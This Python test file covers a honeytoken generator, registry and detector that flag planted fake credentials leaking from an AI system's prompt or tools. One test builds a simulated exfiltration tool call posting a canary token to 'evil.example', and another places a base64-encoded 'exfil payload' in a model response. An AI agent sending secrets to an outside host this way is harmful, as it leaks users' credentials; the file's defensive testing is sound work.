"""Tests for the honeytoken generator, registry, and detector."""

from __future__ import annotations

import base64
import re

from aegis.detectors.honeytoken import HoneytokenDetector
from aegis.events import AegisEvent
from aegis.honeytokens.generator import FORMATS, generate
from aegis.honeytokens.registry import HoneytokenRegistry

# Hard format masks the generator must always satisfy.
_SHAPES = {
    "aws_access_key": re.compile(r"^AKIA[A-Z0-9]{16}$"),
    "oauth_bearer": re.compile(r"^Bearer [A-Za-z0-9\-_]{32}$"),
    "openai_key": re.compile(r"^sk-[A-Za-z0-9]{32}$"),
    "jwt": re.compile(r"^[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+$"),
    "stripe_live": re.compile(r"^sk_live_[A-Za-z0-9]{24}$"),
    "github_pat": re.compile(r"^ghp_[A-Za-z0-9]{36}$"),
}


def test_generator_produces_format_valid_tokens():
    assert set(FORMATS) == set(_SHAPES)
    for fmt, shape in _SHAPES.items():
        token = generate(fmt, seed=7)
        assert shape.match(token), f"{fmt} produced invalid token: {token!r}"


def test_generator_is_deterministic_with_seed():
    for fmt in FORMATS:
        assert generate(fmt, seed=42) == generate(fmt, seed=42)
    # Different seeds should (overwhelmingly) differ.
    assert generate("openai_key", seed=1) != generate("openai_key", seed=2)


def test_detector_catches_planted_canary_verbatim_in_response():
    reg = HoneytokenRegistry()
    canary = reg.register("aws", "aws_access_key", "system_prompt", seed=1)
    det = HoneytokenDetector(reg)

    event = AegisEvent.for_response(f"Here is the key you asked for: {canary.token}")
    result = det.run(event)

    assert result.verdict.value == "malicious"
    assert result.recommended_action.name == "BLOCK"
    assert result.score == 1.0
    assert result.evidence["canary_id"] == canary.canary_id
    assert result.evidence["where"] == "output"
    assert result.evidence["encoding"] == "verbatim"


def test_detector_catches_base64_encoded_canary_in_response():
    reg = HoneytokenRegistry()
    canary = reg.register("openai", "openai_key", "tool:query_database", seed=2)
    det = HoneytokenDetector(reg)

    encoded = base64.b64encode(canary.token.encode()).decode()
    event = AegisEvent.for_response(f"exfil payload: {encoded}")
    result = det.run(event)

    assert result.verdict.value == "malicious"
    assert result.recommended_action.name == "BLOCK"
    assert result.evidence["encoding"] == "decoded"
    assert result.evidence["service"] == "openai"


def test_detector_catches_canary_in_tool_argument():
    reg = HoneytokenRegistry()
    canary = reg.register("github", "github_pat", "system_prompt", seed=3)
    det = HoneytokenDetector(reg)

    event = AegisEvent.for_tool_call("http_post", {"url": "https://evil.example", "body": canary.token})
    result = det.run(event)

    assert result.verdict.value == "malicious"
    assert result.recommended_action.name == "BLOCK"
    assert result.evidence["where"] == "tool_arg:body"
    assert result.evidence["canary_id"] == canary.canary_id


def test_detector_does_not_fire_on_unrelated_text():
    reg = HoneytokenRegistry()
    reg.register("aws", "aws_access_key", "system_prompt", seed=4)
    det = HoneytokenDetector(reg)

    event = AegisEvent.for_response("The weather is sunny and the build passed.")
    result = det.run(event)

    assert result.verdict.value == "benign"
    assert result.recommended_action.name == "ALLOW"
    assert result.score == 0.0


def test_detector_benign_when_registry_empty():
    det = HoneytokenDetector(HoneytokenRegistry())
    result = det.run(AegisEvent.for_response("anything at all"))
    assert result.verdict.value == "benign"


def test_registry_lookup_and_session_scoping():
    reg = HoneytokenRegistry()
    a = reg.register("aws", "aws_access_key", "system_prompt", session_id="s1", seed=5)
    b = reg.register("stripe", "stripe_live", "tool:pay", session_id="s2", seed=6)

    assert reg.lookup(a.token) is a
    assert reg.lookup("not-a-token") is None
    assert set(reg.tokens()) == {a.token, b.token}
    assert reg.for_session("s1") == [a]
    assert reg.for_session("s2") == [b]
